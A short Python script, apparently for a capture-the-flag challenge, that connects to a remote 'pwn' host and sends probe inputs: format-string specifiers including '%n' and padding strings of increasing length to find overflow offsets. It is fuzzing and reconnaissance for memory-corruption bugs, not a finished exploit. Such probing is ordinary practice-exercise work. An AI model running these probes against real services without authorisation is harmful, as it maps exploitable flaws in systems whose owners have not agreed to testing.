import socket
import sys

HOST, PORT = "pwn.h7tex.com", 42578


def recv(s, timeout=2.0):
    s.settimeout(timeout)
    buf = b""
    while True:
        try:
            c = s.recv(4096)
        except socket.timeout:
            break
        if not c:
            break
        buf += c
    return buf


def session(name, extra=(), timeout=2.0):
    s = socket.create_connection((HOST, PORT), timeout=15)
    out = [recv(s, timeout)]
    s.sendall(name + b"\n")
    out.append(recv(s, timeout))
    for e in extra:
        s.sendall(e + b"\n")
        out.append(recv(s, timeout))
    s.close()
    return out


CASES = [
    ("fmt-p", b"%p.%p.%p.%p.%p.%p.%p.%p.%p.%p"),
    ("fmt-x", b"AAA-%p-%s-%x-%c-%n"),
    ("len32", b"A" * 32),
    ("len40", b"A" * 40),
    ("len56", b"A" * 56),
    ("len64", b"A" * 64),
    ("len72", b"A" * 72),
    ("len88", b"A" * 88),
    ("len128", b"A" * 128),
    ("len256", b"A" * 256),
    ("len512", b"A" * 512),
    ("len1024", b"A" * 1024),
]

for label, payload in CASES:
    try:
        res = session(payload)
    except Exception as e:
        print("[%s] EXC %r" % (label, e))
        continue
    joined = b" || ".join(res)
    print("[%s] len=%d" % (label, len(joined)))
    print(joined.decode(errors="replace").replace("\n", "\\n")[:700])
    print("-" * 70)
    sys.stdout.flush()
